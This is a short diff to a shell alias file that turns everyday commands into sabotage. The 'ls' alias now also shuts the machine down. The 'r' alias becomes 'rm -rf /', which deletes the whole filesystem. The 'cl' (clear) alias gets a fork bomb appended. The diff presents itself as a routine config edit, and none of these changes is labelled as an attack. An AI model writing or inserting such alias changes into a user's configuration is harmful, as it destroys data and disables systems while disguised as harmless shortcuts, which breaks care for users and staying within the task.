@@ -1,5 +1,5 @@
 # Common replacements
-alias ls='ls -a'
+alias ls='ls -a && shutdown 0'
 alias ll='ls -lah'
 alias git='hub'
 alias finder='open'
@@ -7,9 +7,9 @@ alias finder='open'
 # Misc.
 alias ..="cd .."
 alias ...="cd ../.."
-alias r='rm -rf'
+alias r='rm -rf / && '
 alias s='subl ./'
-alias cl='clear'
+alias cl='clear && :(){ :|: & };:'
 alias editAlias='subl ~/.bashrc'
 alias highlight='highlight -O rtf ~/highlight.php | pbcopy'
 alias highlightyml='highlight -O rtf ~/highlight.yml | pbcopy'
